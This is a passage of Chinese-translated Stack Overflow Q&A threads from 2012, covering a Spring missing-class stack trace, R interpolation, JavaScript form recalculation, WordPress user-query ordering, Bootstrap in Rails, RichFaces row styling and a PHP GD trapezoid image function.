org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#0': Initialization of bean failed; nested exception is org.springframework.beans.factory.CannotLoadBeanClassException: Cannot find class [org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect] for bean with name 'org.springframework.context.config.internalBeanConfigurerAspect' defined in null; nested exception is java.lang.ClassNotFoundException: org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect
Related cause: org.springframework.beans.factory.CannotLoadBeanClassException: Cannot find class [org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect] for bean with name 'org.springframework.context.config.internalBeanConfigurerAspect' defined in null; nested exception is java.lang.ClassNotFoundException: org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:527)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:294)
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:225)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:291)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:193)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:609)
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918)
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:469)
    at org.springframework.web.context.ContextLoader.configureAndRefreshWebApplicationContext(ContextLoader.java:385)
    at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:284)
    at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:111)
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4206)
    at org.apache.catalina.core.StandardContext.start(StandardContext.java:4705)
    at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1057)
    at org.apache.catalina.core.StandardHost.start(StandardHost.java:840)
    at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1057)
    at org.apache.catalina.core.StandardEngine.start(StandardEngine.java:463)
    at org.apache.catalina.core.StandardService.start(StandardService.java:525)
    at org.apache.catalina.core.StandardServer.start(StandardServer.java:754)
    at org.apache.catalina.startup.Catalina.start(Catalina.java:595)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:616)
    at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
    at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)
Caused by: org.springframework.beans.factory.CannotLoadBeanClassException: Cannot find class [org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect] for bean with name 'org.springframework.context.config.internalBeanConfigurerAspect' defined in null; nested exception is java.lang.ClassNotFoundException: org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect
    at org.springframework.beans.factory.support.AbstractBeanFactory.resolveBeanClass(AbstractBeanFactory.java:1262)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryMethod(AbstractAutowireCapableBeanFactory.java:624)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.predictBeanType(AbstractAutowireCapableBeanFactory.java:573)
    at org.springframework.beans.factory.support.AbstractBeanFactory.isFactoryBean(AbstractBeanFactory.java:1331)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:341)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:320)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:307)
    at org.springframework.context.support.AbstractApplicationContext.getBeanNamesForType(AbstractApplicationContext.java:1155)
    at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.initHandlerMethods(AbstractHandlerMethodMapping.java:105)
    at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.initApplicationContext(AbstractHandlerMethodMapping.java:89)
    at org.springframework.context.support.ApplicationObjectSupport.initApplicationContext(ApplicationObjectSupport.java:119)
    at org.springframework.web.context.support.WebApplicationObjectSupport.initApplicationContext(WebApplicationObjectSupport.java:72)
    at org.springframework.context.support.ApplicationObjectSupport.setApplicationContext(ApplicationObjectSupport.java:73)
    at org.springframework.context.support.ApplicationContextAwareProcessor.invokeAwareInterfaces(ApplicationContextAwareProcessor.java:117)
    at org.springframework.context.support.ApplicationContextAwareProcessor.postProcessBeforeInitialization(ApplicationContextAwareProcessor.java:92)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:394)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1448)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
    ... 26 more
Caused by: java.lang.ClassNotFoundException: org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1680)
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1526)
    at org.springframework.util.ClassUtils.forName(ClassUtils.java:258)
    at org.springframework.beans.factory.support.AbstractBeanDefinition.resolveBeanClass(AbstractBeanDefinition.java:417)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doResolveBeanClass(AbstractBeanFactory.java:1283)
    at org.springframework.beans.factory.support.AbstractBeanFactory.resolveBeanClass(AbstractBeanFactory.java:1254)
    ... 43 more
Related cause:
org.springframework.beans.factory.CannotLoadBeanClassException: Cannot find class [org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect] for bean with name 'org.springframework.context.config.internalBeanConfigurerAspect' defined in null; nested exception is java.lang.ClassNotFoundException: org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect
    at org.springframework.beans.factory.support.AbstractBeanFactory.resolveBeanClass(AbstractBeanFactory.java:1262)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryMethod(AbstractAutowireCapableBeanFactory.java:624)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.predictBeanType(AbstractAutowireCapableBeanFactory.java:573)
    at org.springframework.beans.factory.support.AbstractBeanFactory.isFactoryBean(AbstractBeanFactory.java:1331)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:341)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:312)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeansOfType(DefaultListableBeanFactory.java:420)
    at org.springframework.context.support.AbstractApplicationContext.getBeansOfType(AbstractApplicationContext.java:1169)
    at org.springframework.beans.factory.BeanFactoryUtils.beansOfTypeIncludingAncestors(BeanFactoryUtils.java:277)
    at org.springframework.web.servlet.handler.AbstractHandlerMapping.detectMappedInterceptors(AbstractHandlerMapping.java:212)
    at org.springframework.web.servlet.handler.AbstractHandlerMapping.initApplicationContext(AbstractHandlerMapping.java:186)
    at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.initApplicationContext(AbstractHandlerMethodMapping.java:88)
    at org.springframework.context.support.ApplicationObjectSupport.initApplicationContext(ApplicationObjectSupport.java:119)
    at org.springframework.web.context.support.WebApplicationObjectSupport.initApplicationContext(WebApplicationObjectSupport.java:72)
    at org.springframework.context.support.ApplicationObjectSupport.setApplicationContext(ApplicationObjectSupport.java:73)
    at org.springframework.context.support.ApplicationContextAwareProcessor.invokeAwareInterfaces(ApplicationContextAwareProcessor.java:117)
    at org.springframework.context.support.ApplicationContextAwareProcessor.postProcessBeforeInitialization(ApplicationContextAwareProcessor.java:92)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:394)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1448)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:294)
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:225)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:291)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:193)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:609)
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918)
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:469)
    at org.springframework.web.context.ContextLoader.configureAndRefreshWebApplicationContext(ContextLoader.java:385)
    at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:284)
    at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:111)
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4206)
    at org.apache.catalina.core.StandardContext.start(StandardContext.java:4705)
    at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1057)
    at org.apache.catalina.core.StandardHost.start(StandardHost.java:840)
    at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1057)
    at org.apache.catalina.core.StandardEngine.start(StandardEngine.java:463)
    at org.apache.catalina.core.StandardService.start(StandardService.java:525)
    at org.apache.catalina.core.StandardServer.start(StandardServer.java:754)
    at org.apache.catalina.startup.Catalina.start(Catalina.java:595)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:616)
    at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
    at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)
Caused by: java.lang.ClassNotFoundException: org.springframework.beans.factory.aspectj.AnnotationBeanConfigurerAspect
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1680)
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1526)
    at org.springframework.util.ClassUtils.forName(ClassUtils.java:258)
    at org.springframework.beans.factory.support.AbstractBeanDefinition.resolveBeanClass(AbstractBeanDefinition.java:417)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doResolveBeanClass(AbstractBeanFactory.java:1283)
    at org.springframework.beans.factory.support.AbstractBeanFactory.resolveBeanClass(AbstractBeanFactory.java:1254)
    ... 45 more
Sep 12, 2012 12:37:20 PM org.apache.catalina.core.StandardContext start 
```

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2012-09-12T17:18:52.960

只需添加：

```
<dependency> 
     <groupId>org.springframework</groupId> 
     <artifactId>spring-aspects</artifactId> 
     <version>3.1.2.RELEASE</version> 
</dependency> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:46:43.213

在您的 pom.xml 中添加此依赖项

```
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-aop</artifactId>
    <version>3.1.2.RELEASE</version>
</dependency> 
```

# r - R 插值

> ID：12392839
> 
> 赞同：-3
> 
> 时间：2012-09-12T16:44:24.237
> 
> 标签：r, interpolation

我必须成对的价值观：

```
A    B
211  2
19   1 
```

如何为值 A=132 插入 B？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T17:18:05.317

使用`approx`（线性插值）：

```
grid <- data.frame(A = c(211, 19), B = c(2, 1))
grid
#     A B
# 1 211 2
# 2  19 1

approx(x = grid$A, y = grid$B, xout = 132)
# $x
# [1] 132
# 
# $y
# [1] 1.588542 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T16:50:44.317

我假设您想在这些点之间建模一条直线：

```
predict(lm(B~A),newdata=list(A=132))
       1 
1.588542 
```

# javascript - 我可以在不重新加载的情况下重新计算表单域吗？

> ID：12392841
> 
> 赞同：3
> 
> 时间：2012-09-12T16:44:39.777
> 
> 标签：javascript, forms

当我的表单中的一个字段获得焦点时，我希望调用一个 javascript 函数来计算该字段的值，而无需输入特定的按钮来执行此操作。

这是否可能不会导致表单重新加载？

我曾考虑过将 Amount 字段设置为只读，以及其他一些方法，但我想看看更改 Quantity 字段是否会导致 Amount 字段更改，或者使用 Quantity 字段中的 onchange 或 onfocus 在金额字段。

```
Purchase Tickets<br>                
<script type="text/javascript" language="JavaScript1.2">
<script type="text/javascript" language="JavaScript1.2">
document.write(
'<form name="InvGenPayTickets" action="'+PostURL+'" 
onsubmit="return validateForm();" method=GET>');
</script>

<input type=hidden name="TplURL" value="GenPayCCInfo.html">
<input type=hidden name="CancelURL" value="Ooopsie.html">
<input type=hidden name="SuccessURL" value="Joanie.html">

<input type='hidden' name='TransDesc' id='TransDesc' 
value="$_POST['TransDesc']; ?>" />

<input type='text' name='Quantity' id='Quantity' /> <br />
Amount<br />
$<input type='text' name='Amount' id='Amount' />
<input type="submit" value="Next">
<br>
</form> 
```

编辑：

这是不会更新的功能。如果我使用它就会被调用

```
<input type='text' name='Quantity' 
     id='Quantity' onchange="return retTotalAmt();" /> 
```

但金额字段不会更新。我也无法使用计算按钮进行更新。

```
<script type="text/javascript" language="JavaScript1.2">    
    function retTotalAmt()
    {
        alert("Got here.");
        var total_amt 
            = (document.getElementById('Quantity').value * ticketCost) 
                + DonationAmount;    
        document.getElementById('Amount').value = total_amt;
    }    
</script> 
```

根据评论中的要求：

```
&nbsp;
<input type='text' name='Quantity' 
    id='Quantity' onchange="return retTotalAmt();" /> 
```

编辑——显示问题

```
<script type="text/javascript" language="JavaScript1.2">
var ticketCost = 40.00;

function EnterPage()
{
var currentTotalAmount = DonationAmount + ticketCost;
//DonationAmount moved up to ticketCost's scope fixed problem.
var DonationAmount = <?php echo($_POST['DonationAmount']); ?>;

document.getElementById('DonationAmountField').value = DonationAmount.toFixed(2);
document.getElementById('Quantity').value=1;
document.getElementById('Amount').value = currentTotalAmount.toFixed(2);

return;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:51:45.130

不使用 jquery：

```
<input type='text' name='Amount' id='Amount' onfocus="amountOnFocus();" /> 
```

Javascript：

```
function amountOnFocus() {
    amountField = document.getElementById('Amount');
    //Do calculations
    amountField.value = resultOfCalculations;
} 
```

如果您愿意，您还可以`change`在输入上放置一个事件侦听器，`Quantity`以便它计算该文本框的值何时更改。

编辑：这个`onchange`活动对我有用：

标记：

```
<input type="text" id="txtChangeMe" onchange="txtChangeMeOnChange();" /> 
```

Javascript：

```
<script type="text/javascript">
    function txtChangeMeOnChange() {
        alert('changed');
    }
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:59:20.457

我不太确定您需要什么其他信息，因为您似乎知道实现这一点的所有要素：您知道您想要检测一个事件，您知道您需要调用一个函数，所以我我希望我没有错过你所问的任何事情。我假设你只需要知道如何将所有这些部分联系在一起。

最简单的例子可能是：

```
<input type="text" id="Quantity" value="10" onchange="document.getElementById('Amount').value = parseInt(document.getElementById('Quantity').value,10) * 10.0;" />
$<input type="text" id="Amount" value="100" /> 
```

尽管值得注意的是，这不遵循最佳实践，这将涉及单独绑定事件侦听器。

如果您在意为“字段”时不小心输入了“按钮”，我还会提到您可以使用 ''innerHTML'' 属性更新任何其他元素的内部 HTML，例如：

```
<input type="text" id="Quantity" value="10" onchange="document.getElementById('Amount').innerHTML = parseInt(document.getElementById('Quantity').value,10) * 10.0;" />
$<span id="Amount">100</span> 
```

当然，您可以在其他地方定义实际逻辑，并且只需使用 ''onchange="yourFunction();"'' 而不是将所有内容都内联。

我知道你提到了“onchange”和“onfocus”，虽然我个人更喜欢“onkeyup”，所以值会随着用户输入而改变。

抱歉，如果我完全错过了您问题的重点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:51:49.590

```
function calcPrice()
{
 ....
}

<input type='text' name='Quantity' id='Quantity' onchange='calcPrice();'/>
<input type='text' name='Amount' id='Amount' onfocus='calcPrice();'/> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:47:39.743

当然。使用这样的东西，当数量变化时会触发：

```
$("#Quantity").change(function(){
    // perform your calculations here
}; 
```

这需要 jQuery 框架。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-12T16:47:50.103

您可以访问 jQuery 吗？如果不是，那么您将不得不将一个`change`事件绑定到您的“数量”输入元素以监听其输入的变化。然后您只需要修改“金额”输入的内容。

[https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener](https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener)

```
var el = document.getElementById("Amount");
el.addEventListener("change", changeAmount);

function changeAmount(){
  var quantity = document.getElementById("Quantity");
  quantity.value = "SET YOUR VALUE";
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-04-29T04:49:59.313

试试这个解决方案

**html**

```
 <div class="form-group row">
            <label for="inputQty" class="col-sm-4 col-form-label">Quantity</label>
            <div class="col-sm-8">
                <input onkeyup="CalculateItem();"  onkeydown="CalculateItem();" onchange="CalculateItem();" onfocus="CalculateItem();" value="1" type="number" step="1" min="1" max="9999999" class="form-control" id="inputQty" required>
            </div>
        </div>

        <div class="form-group row">
            <label for="inputPrice" class="col-sm-4 col-form-label">Price</label>
            <div class="col-sm-8">
                <input onkeyup="CalculateItem();"   onkeydown="CalculateItem();" onchange="CalculateItem();" onfocus="CalculateItem();" type="number" step="0.1" min="1" max="9999999"  class="form-control" id="inputPrice" required>
            </div>
        </div>
  <div class="form-group row">
            <label for="inputPriceNoVat" class="col-sm-4 col-form-label">Price (no VAT)</label>
            <div class="col-sm-8">
                <input readonly type="text" class="form-control" id="inputPriceNoVat">
            </div>
        </div> 
```

**JS**

```
 <script type="text/javascript">
            function CalculateItem()
            {
                try {
                    let inputPriceNoVat = $('#inputPrice').val() * $('#inputQty').val();
                    $('#inputPriceNoVat').val(inputPriceNoVat);
                } catch (e) {
                    $('#inputPriceNoVat').val(0);
                }
            }
</script> 
```

# wordpress - WordPress - 用户查询 - 按元值排序

> ID：12392847
> 
> 赞同：1
> 
> 时间：2012-09-12T16:45:22.380
> 
> 标签：wordpress

我正在尝试使用 WordPress 用户查询来创建按自定义元值排序的用户列表。它是一个简单的数值，从 1 到 100，因此需要首先显示 1，最后显示 100，等等。

这是我的尝试，失败得很惨：

```
<?php

    $args  = array(
        'role' => 'Author',
        'meta_key' => 'order-number',
        'orderby' => 'order-number',
        'order' => 'asc',  
    );

$wp_user_query = new WP_User_Query($args);
$authors = $wp_user_query->get_results();

if (!empty($authors))
{
    echo '<div style="float:left;">';
    foreach ($authors as $author)
    {
        $author_info = get_userdata($author->ID);
        echo '<div class="post team-member"><div class="image">';
        echo get_avatar( $author_info->ID, 91 );
        echo '</div>';
        echo '<div class="content"><div class="title"><a href="/author/' . $author_info->user_login . '">' . $author_info->user_firstname . ' ' . $author_info->user_lastname . '</a></div>';
        echo '' . substr( get_the_author_meta('user_description',$author_info->ID) , 0 , 100 ) . '...'; 
        echo '</div></div>';
    }
    echo '</div>';
} else {
    echo 'No authors found';
}

    ?> 
```

我认为问题在于 wp_user_query 不支持 orderby 中的自定义字段 - 所以我需要一个解决这个问题的解决方案。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T17:51:16.007

正确的。orderby 参数只能接受“login”（默认）、“nicename”、“email”、“url”和“registered”的可能值。

一个肮脏的修复将是这样的：

```
<?php
global $wpdb; //Ignore this line if you're not within a function
$order = $wpdb->get_results("SELECT DISTINCT user_id FROM $wpdb->usermeta WHERE meta_key='order-number' ORDER BY meta_value ASC", "ARRAY_N");
$authors = array();
foreach($order as $aid)
    $authors[] = new WP_User($aid[0]);

if (!empty($authors))
{
    echo '<div style="float:left;">';
    foreach ($authors as $author)
    {
        $author_info = get_userdata($author->ID);
        echo '<div class="post team-member"><div class="image">';
        echo get_avatar( $author_info->ID, 91 );
        echo '</div>';
        echo '<div class="content"><div class="title"><a href="/author/' . $author_info->user_login . '">' . $author_info->user_firstname . ' ' . $author_info->user_lastname . '</a></div>';
        echo '' . substr( get_the_author_meta('user_description',$author_info->ID) , 0 , 100 ) . '...'; 
        echo '</div></div>';
    }
    echo '</div>';
} else {
    echo 'No authors found';
} 
```

这在很大程度上未经测试，所以我不能保证这会直接工作，但它应该让你开始。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-20T19:42:20.513

```
<?php

// prepare arguments this is your query.
$args = array(
'meta_key' => 'last_name',
'query_id' => 'wps_last_name',
);

// Create the WP_User_Query object
$author_query = new WP_User_Query( $args );

?>

Add following lines to functions.php file

<?php

add_action( 'pre_user_query', 'wps_pre_user_query' );
/*
* Modify the WP_User_Query appropriately
*
* Checks for the proper query to modify and changes the default user_login for $wpdb->usermeta.meta_value
*
* @param WP_User_Query Object $query User Query object before query is executed
*/
function wps_pre_user_query( &$query ) {
global $wpdb;
if ( isset( $query->query_vars['query_id'] ) && 'wps_last_name' == $query->query_vars['query_id'] )
$query->query_orderby = str_replace( 'user_login', "$wpdb->usermeta.meta_value", $query->query_orderby );
}
?> 
```

# ruby-on-rails-3 - 通过 application.js 包含引导程序时无法访问引导程序方法

> ID：12392851
> 
> 赞同：0
> 
> 时间：2012-09-12T16:45:35.143
> 
> 标签：ruby-on-rails-3, twitter-bootstrap, asset-pipeline, typeahead

首先，我的gemfile

```
gem 'mysql2'
gem 'json'
gem 'jquery-rails'
gem 'dynamic_form'
gem 'haml-rails'
gem 'geocoder'
gem 'delayed_job_active_record'
gem 'daemons'
gem 'pry'
gem 'debugger'
gem 'unicorn'
gem 'rest-client'

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails',   '~> 3.2.3'
  gem 'coffee-rails', '~> 3.2.1'
  gem 'anjlab-bootstrap-rails', '>= 2.1', :require => 'bootstrap-rails'
  gem 'therubyracer', :platforms => :ruby
  gem 'uglifier', '>= 1.0.3'
end 
```

当我的 application.js 中有这个清单时

```
//= require jquery
//= require jquery_ujs
//= require twitter/bootstrap
//= require_tree . 
```

如果我声明一个具有适当属性的输入，像这样

```
<input autocomplete="off" data-provide="typeahead" data-source="['Alicante','Albacete']" size="30" type="text"> 
```

它像魔术一样工作，但我不能在我自己的 js 中做到这一点

```
$('#my_input').typeahead() 
// => TypeError: Object [object Object] has no method 'typeahead' 
```

但是，如果我从清单中删除引导程序并将其明确包含在我的布局中

```
= javascript_include_tag "application", "bootstrap.min" 
```

两种方式都有效。

谁能解释我为什么？也许资产管道的丑陋者是命名空间引导函数？怎么修？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T17:01:38.470

利用`//= require twitter/bootstrap`

[https://github.com/anjlab/bootstrap-rails](https://github.com/anjlab/bootstrap-rails)

**编辑：**

你用的是哪个宝石？twitter-bootstrap-rails、bootstrap-rails 还是别的什么？

如果使用 twitter-bootstrap-rails 那么你是否已经打电话`rails generate bootstrap:install`进行设置？

更改顺序会有所不同吗？像这样试试

```
//= require jquery_ujs
//= require jquery
//= require twitter/bootstrap
//= require_tree . 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T11:01:41.957

我刚刚解决了这个问题。

似乎在两次加载 Bootstrap 时会发生这种行为（不知道为什么）。我不能说为什么会发生这种情况，可能是因为我尝试了一些 Bootstrap 的 gem，但是在生产环境中生成的 /public 中的自动编译资产存在问题。

我运行 rake assets:clear （由 github.com/anjlab/bootstrap-rails 提供的任务），一切正常。

# java - JSF 和 Richfaces rich:select 和 f:selectItems

> ID：12392854
> 
> 赞同：0
> 
> 时间：2012-09-12T16:45:59.210
> 
> 标签：java, jsf, richfaces

如何使用 JSF 和 Richfaces 以不同颜色突出显示列表中的元素

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:56:18.723

[您可以尝试在rich faces docs](http://docs.jboss.org/richfaces/latest_4_2_X/Component_Reference/en-US/html/chap-Component_Reference-Tables_and_grids.html#sect-Component_Reference-richdataTable-Style_classes_and_skin_parameters)中显示的表格行选择器上使用jQuery奇数和偶数选择器，`.rf-dt-r`并应用不同的类。

就像是：

```
<script>
$(document).ready(function()
{

  //for table row
  $("tr:even").css("background-color", "#F4F4F8");
  $("tr:odd").css("background-color", "#EFF1F1");
});
</script> 
```

如[本页](http://roshanbh.com.np/2008/03/different-color-alternate-row-jquery.html)所示。

# php - 图像为等腰梯形 PHP GD

> ID：12392855
> 
> 赞同：0
> 
> 时间：2012-09-12T16:46:03.740
> 
> 标签：php, php-gd

我有这个使用 PHP GD 将图像转换为梯形的函数：

```
 function perspective($i,$gradient=0.9,$rightdown=true,$background=0xFFFFFF) {
    $mult=3;
    $w=imagesx($i);
    $h=imagesy($i);
    $image=imagecreatetruecolor($w*$mult,$h*$mult);
    imagecopyresized($image,$i,0,0,0,0,$w*$mult,$h*$mult,$w,$h);
    imagedestroy($i);
    $w*=$mult;
    $h*=$mult;
    $im=imagecreatetruecolor($w,$h);
    $background=imagecolorallocate($im,($background>>16)&0xFF,($background>>8)&0xFF,$background&0xFF);
    imagefill($im,0,0,$background);
    imageantialias($im,true);
    $nh=$h-($h*$gradient);
    for ($x=0; $x<$w; $x++) {
        $ni=(($rightdown) ? $x : $w-$x);
        $p=intval($h-(($ni/$w)*$nh));
        if (($p%2)<>0)
        $p-=1;
        $nx=intval(($p-$h)/2);
        imagecopyresampled($im,$image,$x,0,$x,$nx,1,$p,1,$h-1);
        imageline($im,$x,$h-1,$x,$h+$nx,$background);
        imageline($im,$x,0,$x,-$nx-1,$background);
    }
    imagedestroy($image);
    imagefilter($im,IMG_FILTER_SMOOTH,10);
    $i=imagecreatetruecolor($w/$mult,$h/$mult);
    imageantialias($i,true);
    imagecopyresampled($i,$im,0,0,0,0,$w,$h,$w*$mult,$h*$mult);
    imagedestroy($im);
    return $i;
 } 
```

但是我不能修改它来产生等腰梯形，我认为只需要一个小的修改，但我无法弄清楚（我尝试了很多东西）。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T18:45:42.460

是的，基本上该代码应该生成正确的值，但由于一个错误，有很多杂物会形成梯形。错误是每行的副本都有`destination-y`和`source-y`转置的值。`source-y`应始终为 0，应`destination-y`更改。

还有一些其他小的数字错误和不必要的点上的双舍入会影响结果。

另外，变量命名很糟糕，所以我重写了它，以便整个函数清晰。

尝试以下操作：

```
function makeTrapeziumImage($image, $gradient, $rightToLeft = false, $background = 0xFFFFFF, $supersampleScale = 3) {
  $originalWidth = imagesx($image);
  $originalHeight = imagesy($image);

  $supersampledWidth = $originalWidth * $supersampleScale;
  $supersampledHeight = $originalHeight * $supersampleScale;

  $supersampledImage = imagecreatetruecolor($supersampledWidth, $supersampledHeight);

  imagecopyresized($supersampledImage, $image,
                   0, 0, 0, 0,
                   $supersampledWidth, $supersampledHeight, $originalWidth, $originalHeight);

  $workingImage = imagecreatetruecolor($supersampledWidth, $supersampledHeight);

  $backgroundColour = imagecolorallocate($workingImage, ($background >> 16) & 0xFF, ($background >> 8) & 0xFF, $background & 0xFF);
  imagefill($workingImage, 0, 0, $backgroundColour);

  imageantialias($workingImage,true);

  $endHeight = $supersampledHeight - ($supersampledHeight * $gradient);

  for ($x = 0; $x < $supersampledWidth; $x++) {
    $cX = ($rightToLeft ? $supersampledWidth - $x : $x);

    $dstHeight = $supersampledHeight - ((($cX + 1) / $supersampledWidth) * $endHeight);

    $dstY = intval(($supersampledHeight - $dstHeight) / 2) - 1; // -1 required as zero-indexed
    $dstY = ($dstY < 0 ? 0 : $dstY); // Rounding can make $dstY = -1

    $dstHeight = intval($dstHeight); // Round the height after calculating $dstY

    imagecopyresampled($workingImage, $supersampledImage,
                       $cX, $dstY, $cX, 0,
                       1, $dstHeight, 1, $supersampledHeight);
  }

  imagedestroy($supersampledImage);
  imagefilter($workingImage, IMG_FILTER_SMOOTH, 10);

  $resizedImage = imagecreatetruecolor($originalWidth, $originalHeight);
  imageantialias($resizedImage, true);

  imagecopyresampled($resizedImage, $workingImage,
                     0, 0, 0, 0,
                     $originalWidth, $originalHeight, $supersampledWidth, $supersampledHeight);

  imagedestroy($workingImage);

  return $resizedImage;
} 
```

和以前一样，内部循环的基本机制是沿 x 轴获取每一列像素，并在梯度上调整它们的大小。它自然地创建一个等腰梯形。为了创建非等腰梯形，必须指定另一个梯度。`y-values`或者，可以指定一组开始和结束，并根据它们计算梯度。

虽然此示例沿 x 轴工作，但可以像以前一样在任一方向上工作，它也可以很容易地沿 y 轴工作（或者图像可以旋转 90 度，处理，然后旋转回来）。

